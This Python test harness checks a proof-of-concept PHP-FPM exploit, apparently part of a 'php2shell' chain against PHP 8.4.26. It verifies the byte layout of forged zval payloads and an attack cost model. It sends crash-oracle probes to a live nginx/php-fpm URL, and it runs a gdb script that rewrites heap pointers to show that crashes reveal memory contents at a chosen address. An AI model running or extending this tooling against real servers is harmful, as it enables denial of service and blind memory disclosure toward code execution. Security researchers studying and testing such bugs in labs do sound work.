#!/usr/bin/env python3
r"""Checks for fpm_content_oracle.py.

Three layers, each independently runnable (python3 -I safe):

  OFFLINE (default, no network/docker): assert the forged-zval payload byte
  layout is exactly the engine-facing zend_string / zend_array shape, and that
  the cost model is self-consistent.

  --live URL : run the app-free LIVENESS bit against a real nginx->php-fpm
  target and confirm the crash oracle is observable black-box.

  --gdb-proof : on a live PHP 8.4.26 under gdb, forge a real heap zend_string's
  zval pointer to a CHOSEN address A and run a plain core string read, for three
  cases of the content/mapping at A:
      small  : *(A-8) is a small length, A mapped   -> expect SURVIVE
      huge   : *(A-8) ~= 5 TiB                        -> expect CRASH (emalloc abort)
      unmapped: A is unmapped                         -> expect CRASH (SIGSEGV)
  A differing (SURVIVE vs CRASH) outcome proves the crash is value-dependent on
  the chosen address -- a CONTENT oracle, not a liveness bit. Needs the
  gdb-enabled fpm image (default: php2shell-gdbfpm:latest) and SYS_PTRACE.
"""
from __future__ import annotations

import argparse
import os
import struct
import subprocess
import sys
import tempfile

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import fpm_content_oracle as O   # noqa: E402  (import-safe: all defs/consts)

GDB_IMAGE = "php2shell-gdbfpm:latest"


# OFFLINE: payload layout + cost-model self-consistency
def check_offline():
    ok = True

    def expect(name, cond):
        nonlocal ok
        print(("  [PASS] " if cond else "  [FAIL] ") + name)
        ok = ok and cond

    A = 0x7ffff6000000
    s = O.forge_string_zval(A)
    expect("string zval is 16 bytes", len(s) == 16)
    expect("string zval .value.ptr == A-0x18 (so val == A, len read at A-8)",
           struct.unpack("<Q", s[:8])[0] == A - O.ZSTR_VAL)
    expect("string zval type_info == IS_STRING (0x06)",
           struct.unpack("<I", s[8:12])[0] == O.IS_STRING)

    a = O.forge_array_zval(A)
    expect("array zval is 16 bytes", len(a) == 16)
    expect("array zval .value.ptr == A (arData read at A+0x10)",
           struct.unpack("<Q", a[:8])[0] == A)
    expect("array zval type_info == IS_ARRAY (0x07)",
           struct.unpack("<I", a[8:12])[0] == O.IS_ARRAY)

    cm = O.cost_model()
    expect("cost: 1 bit/request", cm["bits_per_request"] == 1)
    expect("cost: mapping-walk 512 probes / 2MiB chunk",
           cm["mapping_walk_probes_per_chunk"] == 512)
    expect("cost: requires an anchor (no app-free bootstrap on fpm)",
           cm["requires_anchor"] and not cm["anchor_source_app_free_on_fpm"])
    return ok


# LIVE: the app-free liveness bit against a real fpm target
def check_live(url, nparts):
    print("[*] app-free liveness bit against %s" % url)
    if not O.worker_alive(url):
        print("  [SKIP] target not serving 200 on GET; is the fpm lab up?")
        return True
    r = O.liveness_probe(url, nparts=nparts)
    for k in ("worker_before", "probe_status", "transport_error",
              "worker_after", "oom_size_reflected", "leaks_pointer"):
        print("    %-20s %s" % (k, r[k]))
    # The oracle is "observable" if the worker was up before and is up again
    # after (respawn), and the probe either dropped the body or returned a
    # status - i.e. we got a distinguishable signal with no pointer leak.
    observable = r["worker_before"] and r["worker_after"] and not r["leaks_pointer"]
    print("  [%s] liveness oracle observable black-box, leak-free"
          % ("PASS" if observable else "WARN"))
    if r["oom_size_reflected"]:
        print("  [note] app-free startup OOM reflected a SIZE %s (never a "
              "pointer) - the PART A refinement" % r["oom_size_reflected"])
    return True


# GDB PROOF: value-dependence of the crash at the engine level
_PROBE_PHP = r"""<?php
$tag = "P2SORACLE";
$s = str_repeat($tag, 7);   // 63-byte heap zend_string (clean header)
$s .= "Z";                   // len=64, fresh allocation
usleep(200000);              // gdb breaks here, forges $s's zval pointer
$u = strtoupper($s);         // core read: len=*(val-8) bytes from val
echo "ORA_SURVIVED outlen=".strlen($u)."\n";
"""

_CASE_GDB = r"""set pagination off
set confirm off
catch syscall clock_nanosleep
run
python
import gdb, re, os
inf = gdb.selected_inferior()
CASE = os.environ.get("ORA_CASE", "small")
mark = b"P2SORACLEP2SORACLEP2SORACLEP2SORACLEP2SORACLEP2SORACLEP2SORACLEZ"
out = gdb.execute("info proc mappings", to_string=True)
regs = []
for line in out.splitlines():
    m = re.match(r"\s*(0x[0-9a-f]+)\s+(0x[0-9a-f]+)\s+0x[0-9a-f]+\s+0x[0-9a-f]+\s+(\S+)", line)
    if m:
        regs.append((int(m.group(1), 16), int(m.group(2), 16), m.group(3)))
val = None
for s, e, perm in regs:
    if 'rw' not in perm:
        continue
    f = inf.search_memory(s, e - s, mark)
    if f:
        val = f
        break
if val is None:
    print("ORA_RESULT=NOFIND")
    gdb.execute("quit")
zs = val - 0x18
reg = [r for r in regs if r[0] <= zs < r[1]][0]
TARGET = None
if CASE == "unmapped":
    TARGET = 0x4142434445
else:
    a = reg[0] + 16
    while a < reg[1] - 16:
        q = int.from_bytes(inf.read_memory(a - 8, 8), 'little')
        if CASE == "small" and 1 <= q <= 40 and a + q < reg[1]:
            TARGET = a; break
        if CASE == "huge" and q > 0x100000000:
            TARGET = a; break
        a += 8
if TARGET is None:
    print("ORA_RESULT=NOTARGET")
    gdb.execute("quit")
fake_zs = TARGET - 0x18
try:
    lenq = "0x%x" % int.from_bytes(inf.read_memory(TARGET - 0x08, 8), 'little')
except Exception:
    lenq = "UNMAPPED"
print("ORA_CASE=%s TARGET=0x%x len_qword=%s" % (CASE, TARGET, lenq))
patched = 0
for s, e, perm in regs:
    if 'w' not in perm:
        continue
    a = s
    while a < e - 8:
        f = inf.search_memory(a, e - a, zs.to_bytes(8, 'little'))
        if not f:
            break
        inf.write_memory(f, fake_zs.to_bytes(8, 'little'))
        patched += 1
        a = f + 8
print("ORA_PATCHED=%d" % patched)
gdb.execute("delete")
gdb.execute("continue")
end
"""


def _have_image(name):
    r = subprocess.run(["docker", "images", "-q", name],
                       capture_output=True, text=True)
    return bool(r.stdout.strip())


def check_gdb_proof(image):
    if subprocess.run(["docker", "--version"], capture_output=True).returncode != 0:
        print("  [SKIP] docker unavailable")
        return True
    if not _have_image(image):
        print("  [SKIP] gdb image %s missing (build a gdb-enabled 8.4.26 "
              "php image)" % image)
        return True
    d = tempfile.mkdtemp(prefix="fpmblind-")
    with open(os.path.join(d, "probe.php"), "w") as f:
        f.write(_PROBE_PHP)
    with open(os.path.join(d, "case.gdb"), "w") as f:
        f.write(_CASE_GDB)
    print("[*] gdb value-dependence proof on %s" % image)
    results = {}
    for case in ("small", "huge", "unmapped"):
        cmd = ["docker", "run", "--rm", "--cap-add=SYS_PTRACE",
               "--security-opt", "seccomp=unconfined",
               "-e", "ORA_CASE=" + case, "-v", "%s:/work:ro" % d, image,
               "gdb", "-q", "-batch", "-x", "/work/case.gdb",
               "--args", "php", "-n", "/work/probe.php"]
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        out = (p.stdout or "") + (p.stderr or "")
        survived = "ORA_SURVIVED" in out
        crashed = ("SIGSEGV" in out or "SIGABRT" in out or "Segmentation" in out
                   or "Aborted" in out)
        line = next((l for l in out.splitlines() if l.startswith("ORA_CASE=")), "")
        results[case] = (survived, crashed, line)
        print("    %-9s %s -> %s" % (
            case, line,
            "SURVIVED" if survived else ("CRASH" if crashed else "??\n" + out[-300:])))
    ok = (results["small"][0] and not results["small"][1]
          and results["huge"][1] and not results["huge"][0]
          and results["unmapped"][1] and not results["unmapped"][0])
    print("  [%s] crash-vs-survive is keyed on the content/mapping at the "
          "chosen address (CONTENT oracle, not liveness)"
          % ("PASS" if ok else "FAIL"))
    return ok


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--live", help="fpm target base URL for the liveness bit")
    ap.add_argument("--nparts", type=int, default=40000)
    ap.add_argument("--gdb-proof", action="store_true",
                    help="run the gdb value-dependence proof")
    ap.add_argument("--image", default=GDB_IMAGE)
    args = ap.parse_args(argv)

    all_ok = True
    print("== OFFLINE: forged-zval layout + cost model ==")
    all_ok &= check_offline()
    if args.live:
        print("\n== LIVE: app-free liveness bit ==")
        all_ok &= check_live(args.live, args.nparts)
    if args.gdb_proof:
        print("\n== GDB: value-dependence proof ==")
        all_ok &= check_gdb_proof(args.image)
    print("\n%s" % ("ALL PASS" if all_ok else "SOME CHECKS FAILED"))
    return 0 if all_ok else 1


if __name__ == "__main__":
    sys.exit(main())
